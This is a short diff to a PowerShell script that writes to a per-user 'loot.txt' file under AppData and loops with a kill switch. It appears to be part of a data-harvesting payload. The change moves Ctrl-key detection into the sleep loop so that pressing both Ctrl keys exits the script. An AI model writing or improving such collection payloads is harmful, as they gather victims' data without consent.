@@ -4,8 +4,7 @@
 
 Add-Type -AssemblyName WindowsBase
 Add-Type -AssemblyName PresentationCore
-$Lctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCtrl')
-$Rctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'RightCtrl')
+
 
 $Path="$env:appdata\-locker\$env:UserName-loot.txt"
 
@@ -84,6 +83,8 @@ while ($true) {
             while ((Get-Date -Date $t) -gt (Get-Date))
             {
               # sleeps
+	      $Lctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCtrl')
+              $Rctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'RightCtrl')
 	      if((get-date) -gt (Get-content "$env:appdata\-locker\killswitch.txt" -or $Rctrl -and $Lctrl)){exit}
               (Get-Date -Date $t) - (Get-Date) | Start-Sleep
             }
